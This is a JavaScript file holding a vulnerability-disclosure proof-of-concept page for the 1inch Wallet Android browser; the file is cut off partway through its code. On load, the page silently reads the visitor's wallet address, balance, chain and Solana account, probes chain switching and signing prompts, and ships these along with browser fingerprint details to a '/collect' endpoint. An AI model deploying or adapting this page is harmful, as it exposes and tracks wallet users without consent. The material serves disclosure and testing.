export const POC_HTML = `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="referrer" content="no-referrer-when-downgrade">
  <title>1inch Web3 browser — it hands over my wallet with no consent</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Archivo:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg:#131211; --surface:#1e1c1a; --ink:#f1efec;
      --muted:#9c9793; --faint:#6d6863; --line:#494440;
      --hair:#2c2926; --accent:#ec3013; --accent-deep:#ff6b4f;
      --tint:#3a1b13;
      --mono:ui-monospace,"SFMono-Regular","Roboto Mono",Menlo,Consolas,monospace;
    }
    *{box-sizing:border-box;}
    html{-webkit-text-size-adjust:100%;}
    body{margin:0;padding:0 20px 72px;background:var(--bg);color:var(--ink);
         font-family:"Archivo",system-ui,sans-serif;font-size:15px;line-height:1.5;
         -webkit-font-smoothing:antialiased;}
    main{max-width:780px;margin:0 auto;}
    ::selection{background:var(--tint);}
    a{color:var(--accent-deep);}
    .mono{font-family:var(--mono);}

    .mast{padding:26px 0 18px;border-bottom:2px solid var(--line);}
    .kicker{font-size:11px;font-weight:700;letter-spacing:.16em;text-transform:uppercase;color:var(--accent-deep);}
    h1{margin:10px 0 0;font-size:28px;font-weight:800;line-height:1.1;letter-spacing:-.01em;}
    .meta-grid{display:grid;grid-template-columns:repeat(2,1fr);margin-top:20px;border:2px solid var(--line);}
    .meta-cell{padding:11px 13px;border-right:2px solid var(--line);border-top:2px solid var(--line);}
    .meta-cell:nth-child(-n+2){border-top:0;}
    .meta-cell:nth-child(2n){border-right:0;}
    .meta-cell .k{font-size:10px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--muted);}
    .meta-cell .v{margin-top:3px;font-family:var(--mono);font-size:13px;word-break:break-all;}
    .meta-cell .v.sev{color:var(--accent-deep);font-weight:700;}

    section{margin-top:40px;}
    .sec-head{display:flex;align-items:baseline;gap:12px;padding-bottom:10px;border-bottom:2px solid var(--line);}
    .sec-num{font-family:var(--mono);font-size:13px;font-weight:700;color:var(--accent-deep);}
    .sec-head h2{margin:0;font-size:18px;font-weight:700;letter-spacing:-.005em;}
    .sec-note{margin:12px 0 0;color:var(--muted);font-size:13.5px;max-width:62ch;}

    .probe{margin-top:16px;border:2px solid var(--line);background:var(--surface);}
    .probe-row{display:grid;grid-template-columns:200px 1fr auto;gap:12px;align-items:start;
               padding:11px 13px;border-top:1px solid var(--hair);}
    .probe-row:first-child{border-top:0;}
    .probe-row .label{font-size:12px;font-weight:600;}
    .probe-row .label .rpc{display:block;margin-top:2px;font-family:var(--mono);font-size:10.5px;
                           font-weight:400;color:var(--faint);word-break:break-all;}
    .probe-row .out{font-family:var(--mono);font-size:12.5px;word-break:break-all;color:var(--ink);}
    .probe-row .out.pending{color:var(--faint);}
    .chip{justify-self:end;white-space:nowrap;padding:3px 8px;font-size:10px;font-weight:700;
          letter-spacing:.06em;text-transform:uppercase;border:1.5px solid var(--line);}
    .chip.leak{background:var(--accent);border-color:var(--accent);color:#fff;}
    .chip.bounded{background:transparent;color:var(--ink);}
    .chip.wait{background:transparent;color:var(--faint);border-color:var(--hair);}
    .chip.err{background:var(--ink);border-color:var(--ink);color:var(--bg);}
    .chip.warn{background:#e6a800;border-color:#e6a800;color:#fff;}

    .chain-banner{margin-top:16px;padding:16px 18px;background:var(--surface);border:2px solid var(--line);
                  display:flex;align-items:baseline;justify-content:space-between;gap:16px;
                  transition:background .15s ease;}
    .chain-banner.flash{background:var(--tint);}
    .chain-banner .b-k{font-size:10px;font-weight:700;letter-spacing:.14em;text-transform:uppercase;color:var(--muted);}
    .chain-banner .b-chain{margin-top:4px;font-size:24px;font-weight:800;line-height:1;}
    .chain-banner .b-hex{font-family:var(--mono);font-size:12px;color:var(--muted);text-align:right;}

    .sw-controls{margin-top:16px;display:flex;align-items:center;gap:12px;flex-wrap:wrap;}
    .sw-controls-note{font-size:12px;color:var(--muted);font-family:var(--mono);}

    .sw-table{margin-top:16px;border:2px solid var(--line);background:var(--surface);overflow-x:auto;}
    .sw-table table{width:100%;border-collapse:collapse;font-size:12.5px;}
    .sw-table thead th{padding:9px 12px;text-align:left;font-size:10px;font-weight:700;
                       letter-spacing:.1em;text-transform:uppercase;color:var(--muted);
                       border-bottom:2px solid var(--line);white-space:nowrap;}
    .sw-table tbody td{padding:9px 12px;font-family:var(--mono);border-bottom:1px solid var(--hair);white-space:nowrap;}
    .sw-table tbody tr:last-child td{border-bottom:0;}
    td.leak{color:var(--accent-deep);font-weight:700;}
    td.bounded{color:var(--ink);}
    td.mut{color:var(--muted);}
    td.warn-cell{color:#d99a2e;font-weight:700;}

    .sw-btn{padding:5px 12px;font-family:"Archivo",system-ui,sans-serif;font-size:11px;font-weight:700;
            letter-spacing:.04em;color:#fff;background:var(--accent);border:1.5px solid var(--accent);
            border-radius:0;cursor:pointer;white-space:nowrap;}
    .sw-btn:hover{background:var(--accent-deep);border-color:var(--accent-deep);}
    .sw-btn:disabled{opacity:.4;cursor:default;}
    .sw-btn.secondary{background:transparent;color:var(--ink);border-color:var(--line);}
    .sw-btn.secondary:hover{background:var(--ink);color:var(--bg);}

    .event-box{margin-top:16px;border:2px solid var(--line);background:var(--surface);padding:14px;}
    .event-box .eb-head{font-size:13px;font-weight:700;}
    .event-box .eb-note{margin-top:6px;font-size:12.5px;color:var(--muted);}
    .event-box .eb-rows{margin-top:12px;display:grid;gap:6px;}
    .event-box .eb-row{display:flex;align-items:center;gap:10px;font-family:var(--mono);font-size:12px;}
    .event-box .eb-key{color:var(--muted);width:180px;flex-shrink:0;}
    .event-box .eb-val{flex:1;word-break:break-all;}
    .event-box .eb-val.leak{color:var(--accent-deep);font-weight:700;}
    .event-box .eb-val.ok{color:#57c06f;font-weight:700;}
    .event-box .eb-val.warn{color:#d99a2e;font-weight:700;}

    button{font-family:"Archivo",system-ui,sans-serif;cursor:pointer;}
    .btn{display:inline-flex;align-items:center;gap:8px;padding:11px 16px;font-size:13px;
         font-weight:700;letter-spacing:.01em;text-align:left;color:#fff;background:var(--accent);
         border:2px solid var(--accent);border-radius:0;}
    .btn:hover{background:var(--accent-deep);border-color:var(--accent-deep);}
    .btn:disabled{opacity:.4;cursor:default;}
    .btn.ghost{color:var(--ink);background:transparent;border-color:var(--line);}
    .btn.ghost:hover{background:var(--ink);color:var(--bg);}
    :focus-visible{outline:2px solid var(--accent);outline-offset:2px;}

    .verdict{margin-top:14px;padding:14px 16px;border-left:3px solid var(--accent);background:var(--surface);
             border-top:1px solid var(--hair);border-right:1px solid var(--hair);border-bottom:1px solid var(--hair);
             font-size:13.5px;line-height:1.55;}

    .tests{margin-top:16px;display:grid;gap:10px;}
    .test{border:2px solid var(--line);background:var(--surface);padding:14px;}
    .test .t-top{display:flex;align-items:baseline;justify-content:space-between;gap:10px;}
    .test .t-name{font-size:14px;font-weight:700;}
    .test .t-method{font-family:var(--mono);font-size:10.5px;color:var(--faint);}
    .test .t-text{margin:8px 0 0;font-size:12.5px;color:var(--muted);}
    .test .t-safe{margin:10px 0 0;padding:8px 10px;background:var(--bg);font-size:11px;
                  color:var(--muted);border-left:2px solid var(--hair);}
    .test .t-result{margin-top:10px;font-family:var(--mono);font-size:11.5px;min-height:18px;color:var(--muted);}
    .test .t-result.leak{color:var(--accent-deep);font-weight:600;}
    .test .t-result.err{color:var(--ink);font-weight:600;}
    .test .btn{margin-top:12px;}

    .log-bar{display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-top:16px;}
    .pill{padding:4px 9px;font-size:10px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;
          border:1.5px solid var(--line);}
    .pill.on{background:var(--ink);color:var(--bg);}
    .pill.wait{color:var(--faint);border-color:var(--hair);}
    .log-bar .spacer{flex:1;}
    .log-btn{padding:7px 12px;font-size:11px;font-weight:700;letter-spacing:.04em;background:transparent;
             color:var(--ink);border:1.5px solid var(--line);}
    .log-btn:hover{background:var(--ink);color:var(--bg);}
    #log{margin-top:12px;border:2px solid var(--line);background:var(--surface);}
    .log-line{padding:10px 12px;border-top:1px solid var(--hair);}
    .log-line:first-child{border-top:0;}
    .log-head{display:flex;align-items:baseline;gap:10px;}
    .log-head .ts{font-family:var(--mono);font-size:10.5px;color:var(--faint);}
    .log-head .ttl{font-family:var(--mono);font-size:12px;font-weight:600;word-break:break-all;flex:1;}
    .log-head .st{font-family:var(--mono);font-size:10px;font-weight:700;text-transform:uppercase;
                  letter-spacing:.06em;white-space:nowrap;}
    .st.leak{color:var(--accent-deep);}
    .st.bounded{color:var(--ink);}
    .st.mut{color:var(--muted);}
    .log-raw{margin:8px 0 0;padding:9px 10px;background:var(--bg);font-family:var(--mono);
             font-size:11px;line-height:1.5;white-space:pre-wrap;word-break:break-all;
             border-left:2px solid var(--hair);}
    .empty{padding:14px;color:var(--faint);font-size:12px;}

    footer{margin-top:44px;padding-top:16px;border-top:2px solid var(--line);
           color:var(--muted);font-size:11.5px;line-height:1.55;}

    .danger{margin-top:16px;border:2px solid var(--accent);background:#241412;padding:16px;}
    .danger .d-head{font-size:14px;font-weight:800;color:var(--accent-deep);letter-spacing:-.005em;}
    .danger .d-note{margin-top:8px;font-size:12.5px;color:var(--ink);line-height:1.55;}
    .danger .d-addr{margin-top:12px;padding:10px 12px;background:var(--surface);border:1.5px solid var(--accent);
                    font-family:var(--mono);font-size:12px;word-break:break-all;}
    .danger .d-addr .d-k{display:block;font-size:9.5px;font-weight:700;letter-spacing:.12em;
                         text-transform:uppercase;color:var(--muted);margin-bottom:4px;}
    .danger .d-rules{margin:12px 0 0;padding-left:18px;font-size:12.5px;line-height:1.6;}
    .danger .d-rules b{color:var(--accent-deep);}
    .danger .btn{margin-top:14px;background:var(--ink);border-color:var(--ink);}
    .danger .btn:hover{background:#000;border-color:#000;}
    .danger .obs{margin-top:12px;display:flex;gap:8px;flex-wrap:wrap;}
    .danger .obs .btn{margin-top:0;font-size:12px;padding:9px 13px;}
    .danger .obs .btn.yes{background:var(--accent);border-color:var(--accent);}
    .danger .obs .btn.no{background:transparent;color:var(--ink);border-color:var(--line);}
    .danger .d-result{margin-top:12px;font-family:var(--mono);font-size:11.5px;color:var(--muted);min-height:16px;}
    .danger .d-result.leak{color:var(--accent-deep);font-weight:700;}

    @media(max-width:640px){

      .sw-table{overflow-x:visible;}
      .sw-table table,.sw-table tbody,.sw-table tr,.sw-table td{display:block;width:100%;}
      .sw-table thead{display:none;}
      .sw-table tbody tr{border-bottom:2px solid var(--line);padding:8px 0;}
      .sw-table tbody tr:last-child{border-bottom:0;}
      .sw-table tbody td{border:0;padding:5px 12px;white-space:normal;
                         display:flex;align-items:center;justify-content:space-between;gap:12px;}
      .sw-table tbody td::before{content:attr(data-label);font-family:"Archivo",system-ui,sans-serif;
                                 font-size:10px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;
                                 color:var(--muted);flex-shrink:0;}
      .sw-table tbody td.sw-btn-cell{padding-top:9px;}
      .sw-table tbody td.sw-btn-cell::before{display:none;}
      .sw-table .sw-btn{width:100%;padding:11px;font-size:13px;}
    }
    @media(max-width:540px){
      h1{font-size:22px;}
      .probe-row{grid-template-columns:1fr;gap:6px;}
      .probe-row .chip{justify-self:start;}
      .chain-banner{flex-direction:column;align-items:flex-start;gap:8px;}
    }
  </style>
</head>
<body>
<main>

  <header class="mast">
    <div class="kicker">CWE-285 · CWE-862</div>
    <h1>Any website 1inch Wallet's browser visits connects to the wallet.</h1>
    <div class="meta-grid">
      <div class="meta-cell"><div class="k">Target</div><div class="v">io.oneinch.android · 2.19.0-g</div></div>
      <div class="meta-cell"><div class="k">Class</div><div class="v">Improper authorization (CWE-285/862)</div></div>
      <div class="meta-cell"><div class="k">Severity</div><div class="v sev">Medium · CVSS 5.4</div></div>
      <div class="meta-cell"><div class="k">Session</div><div class="v" id="session-id">—</div></div>
    </div>
  </header>

  <section>
    <div class="sec-head">
      <span class="sec-num">01</span>
      <h2>Available Info</h2>
    </div>
    <p class="sec-note">
      Every check runs on page load. Each row shows the
      method called, the raw return value, and the round-trip time.
    </p>
    <div class="probe">
      <div class="probe-row">
        <div class="label">Provider present<span class="rpc">window.ethereum</span></div>
        <div class="out pending" id="pr-provider">waiting…</div>
        <span class="chip wait" id="pr-provider-chip">pending</span>
      </div>
      <div class="probe-row">
        <div class="label">Provider flags<span class="rpc">isOneInch / isMetaMask / isAndroid</span></div>
        <div class="out pending" id="pr-flags">—</div>
        <span class="chip wait" id="pr-flags-chip">pending</span>
      </div>
      <div class="probe-row">
        <div class="label">Accounts (silent)<span class="rpc">eth_accounts</span></div>
        <div class="out pending" id="pr-accounts">—</div>
        <span class="chip wait" id="pr-accounts-chip">pending</span>
      </div>
      <div class="probe-row">
        <div class="label">Request accounts<span class="rpc">eth_requestAccounts</span></div>
        <div class="out pending" id="pr-reqAccounts">—</div>
        <span class="chip wait" id="pr-reqAccounts-chip">pending</span>
      </div>
      <div class="probe-row">
        <div class="label">Coinbase<span class="rpc">eth_coinbase</span></div>
        <div class="out pending" id="pr-coinbase">—</div>
        <span class="chip wait" id="pr-coinbase-chip">pending</span>
      </div>
      <div class="probe-row">
        <div class="label">Active chain<span class="rpc">eth_chainId</span></div>
        <div class="out pending" id="pr-chain">—</div>
        <span class="chip wait" id="pr-chain-chip">pending</span>
      </div>
      <div class="probe-row">
        <div class="label">Native balance<span class="rpc">eth_getBalance</span></div>
        <div class="out pending" id="pr-balance">—</div>
        <span class="chip wait" id="pr-balance-chip">pending</span>
      </div>
      <div class="probe-row">
        <div class="label">Transaction count<span class="rpc">eth_getTransactionCount</span></div>
        <div class="out pending" id="pr-nonce">—</div>
        <span class="chip wait" id="pr-nonce-chip">pending</span>
      </div>
      <div class="probe-row">
        <div class="label">Latest block<span class="rpc">eth_blockNumber</span></div>
        <div class="out pending" id="pr-block">—</div>
        <span class="chip wait" id="pr-block-chip">pending</span>
      </div>
      <div class="probe-row">
        <div class="label">USDC bytecode check<span class="rpc">eth_getCode (0xA0b8…eB48)</span></div>
        <div class="out pending" id="pr-code">—</div>
        <span class="chip wait" id="pr-code-chip">pending</span>
      </div>
      <div class="probe-row">
        <div class="label">Solana account<span class="rpc">solana.connect(onlyIfTrusted)</span></div>
        <div class="out pending" id="pr-solana">—</div>
        <span class="chip wait" id="pr-solana-chip">pending</span>
      </div>
    </div>
  </section>

  <section>
    <div class="sec-head">
      <span class="sec-num">02</span>
      <h2>Silent network switching</h2>
    </div>
    <p class="sec-note">
      Per EIP-3326, the wallet_switchEthereumChain must prompt
      before changing the active network. Press Switch on any row you would like.
    </p>

    <div class="chain-banner" id="chain-banner">
      <div>
        <div class="b-k">Current wallet network</div>
        <div class="b-chain" id="banner-name">—</div>
      </div>
      <div class="b-hex" id="banner-hex">waiting for provider</div>
    </div>

    <div class="sw-controls">
      <span class="sw-controls-note" id="sw-count-note">loading network list…</span>
    </div>

    <div class="sw-table" id="sw-table-wrap">
      <table id="sw-table">
        <thead>
          <tr>
            <th>Network</th>
            <th>Chain ID</th>
            <th>Before</th>
            <th>After</th>
            <th>Round trip</th>
            <th>Result</th>
            <th></th>
          </tr>
        </thead>
        <tbody id="sw-tbody"></tbody>
      </table>
    </div>

    <div class="verdict" id="sw-verdict" hidden></div>
  </section>

  <section>
    <div class="sec-head">
      <span class="sec-num">03</span>
      <h2>Signing surface is exposed</h2>
    </div>
    <p class="sec-note">
      Here you can try some of the Signing Prompts (won't do anything.)
    </p>
    <div class="tests" id="tests"></div>
  </section>

  <section>
    <div class="sec-head">
      <span class="sec-num">04</span>
      <h2>Evidence log</h2>
    </div>
    <p class="sec-note">
      Every method call and its raw response, in order. Results are shipped to the
      collector on each action so evidence survives if this tab closes.
    </p>
    <div class="log-bar">
      <span class="pill wait" id="beacon-pill">collector: idle</span>
      <span class="pill" id="log-count">0 entries</span>
      <span class="spacer"></span>
      <button class="log-btn" id="copy-log">Copy JSON</button>
      <button class="log-btn" id="clear-log">Clear view</button>
    </div>
    <div id="log"><div class="empty" id="log-empty">Nothing logged yet.</div></div>
  </section>

  <footer>
    All payloads are inert: zero values, expired
    deadlines, same address as maker and receiver, no real spender. Signig and
    transactions still require the native 1inch confirmation screen.
  </footer>
</main>

<script>
(function(){
  var _ev=typeof window.ethereum!=='undefined'?window.ethereum:undefined;
  function _fire(v){try{window.dispatchEvent(new CustomEvent('_ei',{detail:v}));}catch(e){}}
  if(_ev!==undefined){_fire(_ev);}
  else{try{Object.defineProperty(window,'ethereum',{configurable:true,enumerable:true,
    get:function(){return _ev;},
    set:function(v){_ev=v;try{Object.defineProperty(window,'ethereum',{configurable:true,enumerable:true,writable:true,value:v});}catch(e){}_fire(v);}
  });}catch(e){}}
}());

(function () {
  "use strict";

  var ZERO_ADDR   = "0x0000000000000000000000000000000000000000";
  var ZERO_B32    = "0x0000000000000000000000000000000000000000000000000000000000000000";
  var USDC_ADDR   = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
  var ROUTER_ADDR = "0x111111125421cA6dc452d289314280a0f8842A65";
  var PERMIT2     = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
  var SEAPORT     = "0x0000000000000068F116a894984e2DB1123eB395";

  var SWITCH_CHAINS = [
    { id: "0x1",    name: "Ethereum"   },
    { id: "0x38",   name: "BNB Chain"  },
    { id: "0x89",   name: "Polygon"    },
    { id: "0xa",    name: "Optimism"   },
    { id: "0xa4b1", name: "Arbitrum"   },
    { id: "0x64",   name: "Gnosis"     },
    { id: "0xa86a", name: "Avalanche"  },
    { id: "0x144",  name: "zkSync Era" },
    { id: "0x2105", name: "Base"       },
    { id: "0xe708", name: "Linea"      },
    { id: "0x92",   name: "Sonic"      },
    { id: "0x82",   name: "Unichain"   },
    { id: "0x1237", name: "Robinhood"  }
  ];

  var CHAIN_NAMES = {
    "0x1":"Ethereum","0x38":"BNB Chain","0x89":"Polygon","0xa":"Optimism",
    "0xa4b1":"Arbitrum","0x64":"Gnosis","0xa86a":"Avalanche","0x144":"zkSync Era",
    "0x2105":"Base","0xe708":"Linea","0x92":"Sonic","0x82":"Unichain","0x1237":"Robinhood",
    "0xaa36a7":"Sepolia","0x5":"Goerli","0x4268":"Holesky",
    "0x539":"Localhost:1337","0x7a69":"Localhost:31337"
  };
  var CHAIN_CCY = {};

  function enrichWithLiveChainList() {
    return fetch("https://chainid.network/chains_mini.json", { cache:"force-cache" })
      .then(function(r){ return r.ok ? r.json() : null; })
      .then(function(list){
        if (!Array.isArray(list)) return false;
        list.forEach(function(c){
          if (!c || typeof c.chainId !== "number") return;
          var hex = "0x" + c.chainId.toString(16);
          if (c.name) CHAIN_NAMES[hex] = CHAIN_NAMES[hex] || c.name;
          if (c.nativeCurrency && c.nativeCurrency.symbol) CHAIN_CCY[hex] = c.nativeCurrency.symbol;
        });
        record("chain_list_fetched", { count:list.length, source:"chainid.network" });
        return true;
      })
      .catch(function(){ return false; });
  }

  var TEST_CHAINS = { "0x5":1,"0xaa36a7":1,"0x4268":1,"0x539":1,"0x7a69":1 };

  var SESSION = (window.crypto && crypto.randomUUID && crypto.randomUUID()) ||
    (Date.now().toString(36) + "-" + Math.random().toString(16).slice(2));
  var PAGE_OPEN = performance.now ? performance.now() : Date.now();
  var OPENED = new Date().toISOString();

  var _events   = [];
  var _seq      = 0;
  var _dirty    = false;
  var _sending  = false;
  var _lastFlush= 0;
  var _timer    = null;
  var FLUSH_MIN = 800;

  function nowMs() {
    return Math.round((performance.now ? performance.now() : Date.now()) - PAGE_OPEN);
  }

  function record(type, fields) {
    _seq++;
    var ev = { n: _seq, type: type, ms: nowMs(), at: new Date().toISOString() };
    if (fields) Object.keys(fields).forEach(function(k){ ev[k] = fields[k]; });
    _events.push(ev);
    _dirty = true;
    scheduleFlush();
    return ev;
  }

  function sessionBody() {
    return JSON.stringify({
      session: SESSION, opened: OPENED, url: location.href,
      ref: document.referrer || null, ua: navigator.userAgent,
      _screen: (screen.width||0)+"x"+(screen.height||0),
      _lang: navigator.language||"",
      _tz: new Date().getTimezoneOffset(),
      events: _events
    });
  }

  function markBeacon(state) {
    var pill = $id("beacon-pill");
    if (!pill) return;
    if (state === "sent") { pill.className="pill on"; pill.textContent="collector: "+_events.length+" sent"; }
    else if (state === "sending") { pill.className="pill on"; pill.textContent="collector: sending…"; }
    else { pill.className="pill wait"; pill.textContent="collector: "+(_events.length?"buffered":"idle"); }
  }

  function flush(sync) {
    if (!_dirty && !sync) return;
    _dirty = false; _lastFlush = Date.now();
    var body = sessionBody();
    if (sync) { navigator.sendBeacon && navigator.sendBeacon("/collect", new Blob([body],{type:"application/json"})); return; }
    _sending = true; markBeacon("sending");
    fetch("/collect",{ method:"POST", keepalive:true, headers:{"Content-Type":"application/json"}, body:body })
      .then(function(){ _sending=false; markBeacon("sent"); })
      .catch(function(){
        _sending=false; _dirty=true; markBeacon("idle");
        navigator.sendBeacon && navigator.sendBeacon("/collect", new Blob([body],{type:"application/json"}));
      });
  }

  function shipNow() {
    var body = sessionBody();
    _dirty = false; _lastFlush = Date.now();
    if (navigator.sendBeacon) { try { navigator.sendBeacon("/collect", new Blob([body],{type:"application/json"})); } catch(e){} }
    try { fetch("/collect",{ method:"POST", keepalive:true, headers:{"Content-Type":"application/json"}, body:body }); } catch(e){}
    markBeacon("sent");
  }

  function scheduleFlush() {
    markBeacon(_sending?"sending":"idle");
    if (_timer) return;
    var wait = Math.max(0, FLUSH_MIN - (Date.now() - _lastFlush));
    _timer = setTimeout(function(){ _timer=null; flush(false); }, wait);
  }

  window.addEventListener("pagehide", function(){ flush(true); });
  document.addEventListener("visibilitychange", function(){
    if (document.visibilityState === "hidden") flush(true);
  });

  function $id(id) { return document.getElementById(id); }

  function setText(id, text, cls) {
    var el = $id(id); if (!el) return;
    el.textContent = text;
    if (cls !== undefined) el.className = cls;
  }

  function setChip(id, label, kind) {
    var el = $id(id + "-chip"); if (!el) return;
    el.textContent = label; el.className = "chip " + kind;
  }

  function safeStringify(v) {
    if (v === undefined) return "undefined";
    if (v === null) return "null";
    if (typeof v === "string") return v;
    if (typeof v === "bigint") return v.toString();
    if (typeof v === "number" || typeof v === "boolean") return String(v);
    var seen = [];
    try {
      return JSON.stringify(v, function(k, val) {
        if (typeof val === "bigint") return val.toString();
        if (val instanceof Error) return { name:val.name, message:val.message, code:val.code, data:val.data };
        if (val && typeof val === "object") {
          if (seen.indexOf(val) !== -1) return "[circular]";
          seen.push(val);
        }
        return val;
      }, 2);
    } catch (e) {
      try { return String(v); } catch(_) { return "[unserializable]"; }
    }
  }

  function errCode(err) {
    if (!err || typeof err !== "object") return null;
    if (err.code != null) return err.code;
    if (err.error && err.error.code != null) return err.error.code;
    if (err.data && err.data.code != null) return err.data.code;
    return null;
  }

  function getError(err) {
    if (err == null) return "Unknown error";
    if (typeof err === "string") return err;
    var code = errCode(err);
    var msg = err.message;
    if (msg && typeof msg === "object") msg = msg.message || safeStringify(msg);
    if (!msg && err.error) msg = typeof err.error === "string" ? err.error : (err.error.message || safeStringify(err.error));
    if (!msg && err.data) msg = typeof err.data === "string" ? err.data : (err.data.message || safeStringify(err.data));
    if (!msg) { var s = safeStringify(err); msg = (s === "{}" || s === "[object Object]") ? "(no message)" : s; }
    var codeName = RPC_CODES[code];
    return (code != null ? "["+code+(codeName?" "+codeName:"")+"] " : "") + msg;
  }

  var RPC_CODES = {
    "4001":"user rejected","4100":"unauthorized","4200":"unsupported method","4900":"disconnected","4902":"chain not added",
    "-32000":"invalid input","-32002":"resource unavailable","-32003":"transaction rejected","-32601":"method not found","-32602":"invalid params","-32603":"internal error"
  };

  function fmtResult(v) {
    if (v === undefined) return "undefined";
    if (v === null) return "null";
    if (typeof v === "string") return v;
    return safeStringify(v);
  }

  function isRejected(err) { return err && (errCode(err) === 4001 || errCode(err) === -32003 || /reject|denied|cancel|declin/i.test(getError(err))); }
  function isAddress(v)  { return typeof v==="string" && /^0x[0-9a-fA-F]{40}$/.test(v); }
  function timestamp()   { return new Date().toISOString().slice(11,23); }
  function toEth(hex)    { try { return (Number(BigInt(hex))/1e18).toFixed(6); } catch(e){ return hex; } }
  function unixNow()     { return Math.floor(Date.now()/1000); }
  function expiredDeadline() { return String(unixNow()-3600); }
  function randomBytes32() {
    var b=new Uint8Array(32); crypto.getRandomValues(b);
    return "0x"+Array.from(b).map(function(x){return x.toString(16).padStart(2,"0");}).join("");
  }
  function toHex(text) {
    var b=new TextEncoder().encode(text), out="0x";
    for(var i=0;i<b.length;i++) out+=b[i].toString(16).padStart(2,"0");
    return out;
  }
  function normalizeChainId(v) {
    if (v===null||v===undefined||v==="") return null;
    try { return "0x"+BigInt(v).toString(16); } catch(e){ return String(v).toLowerCase(); }
  }
  function chainLabel(id) { return id ? (CHAIN_NAMES[id] || id) : "unknown"; }
  function wait(ms) { return new Promise(function(res){ setTimeout(res,ms); }); }
  function withTimeout(promise, ms) {
    return Promise.race([
      Promise.resolve(promise),
      new Promise(function(res){ setTimeout(function(){ res(); }, ms); })
    ]);
  }

  function callWithTimeout(method, params, ms) {
    return new Promise(function(resolve){
      var done=false;
      var t=setTimeout(function(){ if(done)return; done=true; resolve({timedOut:true}); }, ms);
      ethereum.request({ method:method, params:params||[] }).then(
        function(v){ if(done)return; done=true; clearTimeout(t); resolve({value:v}); },
        function(e){ if(done)return; done=true; clearTimeout(t); resolve({err:e}); }
      );
    });
  }

  var _logCount = 0;

  function stateClass(state) {
    if (state==="disclosed"||state==="switched"||state==="returned") return "leak";
    if (state==="bounded"||state==="rejected"||state==="native-confirm") return "bounded";
    return "mut";
  }

  function addLog(title, state, detail) {
    var ts = timestamp();
    var empty = $id("log-empty"); if (empty) empty.remove();
    var line = document.createElement("div"); line.className="log-line";
    var head = document.createElement("div"); head.className="log-head";
    var tsEl = document.createElement("span"); tsEl.className="ts"; tsEl.textContent=ts;
    var ttl  = document.createElement("span"); ttl.className="ttl"; ttl.textContent=title;
    var st   = document.createElement("span"); st.className="st "+stateClass(state); st.textContent=state;
    head.appendChild(tsEl); head.appendChild(ttl); head.appendChild(st);
    line.appendChild(head);
    if (detail) {
      var pre=document.createElement("div"); pre.className="log-raw"; pre.textContent=detail;
      line.appendChild(pre);
    }
    $id("log").prepend(line);
    record("log", { title:title, state:state, detail:detail||"" });
    _logCount++;
    $id("log-count").textContent = _logCount+(_logCount===1?" entry":" entries");
    $id("log-count").className = "pill";
  }

  var ethereum = null;
  var owner    = "";
  var chainId  = "";
  var chainNum = 1;

  var chainChangedCount   = 0;
  var accountsChangedCount= 0;

  function waitForProvider(maxMs) {
    var start = Date.now();
    return new Promise(function(resolve) {
      (function loop() {
        if (window.ethereum) return resolve(window.ethereum);
        if (Date.now()-start>=maxMs) return resolve(null);
        setTimeout(loop, 100);
      }());
    });
  }

  function readChainId() {
    return callWithTimeout("eth_chainId", [], 5000).then(function(o){
      return o.value !== undefined ? normalizeChainId(o.value) : null;
    });
  }

  function updateBanner(norm, flash) {
    setText("banner-name", chainLabel(norm));
    setText("banner-hex", norm||"—");
    if (flash) {
      var el=$id("chain-banner");
      el.classList.add("flash");
      setTimeout(function(){ el.classList.remove("flash"); }, 320);
    }
  }

  function attachProviderEvents(p) {
    if (!p || !p.on) return;
    p.on("chainChanged", function(newChain) {
      chainChangedCount++;
      var norm = normalizeChainId(newChain);
      chainId = norm;
      try { chainNum = Number(BigInt(newChain)); } catch(e){}
      setText("pr-chain", chainLabel(norm)+" ("+norm+")", "out");
      updateBanner(norm, true);
      setText("eb-chain-events", String(chainChangedCount), chainChangedCount>0?"eb-val ok":"eb-val");
      updateEventAssessment();
    });
    p.on("accountsChanged", function(accounts) {
      accountsChangedCount++;
      owner = (accounts&&accounts[0])||"";
      setText("eb-acc-events", String(accountsChangedCount), accountsChangedCount>0?"eb-val ok":"eb-val");
      updateEventAssessment();
    });
  }

  function renderProviderFlags(p) {
    var flags = {
      isMetaMask: p.isMetaMask===true,
      isOneInchIOSWallet: p.isOneInchIOSWallet===true,
      isOneInchAndroidWallet: p.isOneInchAndroidWallet===true
    };
    setText("pr-flags", JSON.stringify(flags), "out");
    setChip("pr-flags", "read", "bounded");
    setText("eb-ios",     String(flags.isOneInchIOSWallet),
            flags.isOneInchIOSWallet?"eb-val ok":"eb-val warn");
    setText("eb-android", String(flags.isOneInchAndroidWallet),
            flags.isOneInchAndroidWallet?"eb-val ok":"eb-val");
    record("provider_flags", flags);
  }

  function updateEventAssessment() {
    var isIOS     = ethereum && ethereum.isOneInchIOSWallet===true;
    var isAndroid = ethereum && ethereum.isOneInchAndroidWallet===true;
    var msg, cls;
    if (isAndroid && !isIOS && chainChangedCount===0) {
      msg = "CONFIRMED BUG (F-08): isOneInchAndroidWallet=true but events gated on isOneInchIOSWallet, so nothing gets delivered";
      cls = "eb-val leak";
    } else if (chainChangedCount>0) {
      msg = "Events delivered ("+chainChangedCount+" chainChanged, "+accountsChangedCount+" accountsChanged)";
      cls = "eb-val ok";
    } else {
      msg = "Pending. Run a chain switch above to test.";
      cls = "eb-val";
    }
    setText("eb-assessment", msg, cls);
  }

  function probeEthAccounts() {
    var start = performance.now();
    return ethereum.request({ method:"eth_accounts" })
      .then(function(accs) {
        var ms = Math.round(performance.now()-start);
        var addr = accs&&accs[0]||"";
        setText("pr-accounts", JSON.stringify(accs)+" · "+ms+"ms", "out");
        setChip("pr-accounts", addr?"returned":"empty", addr?"leak":"bounded");
        addLog("eth_accounts", addr?"disclosed":"bounded",
          "accounts: "+JSON.stringify(accs)+"\\nround trip: "+ms+"ms");
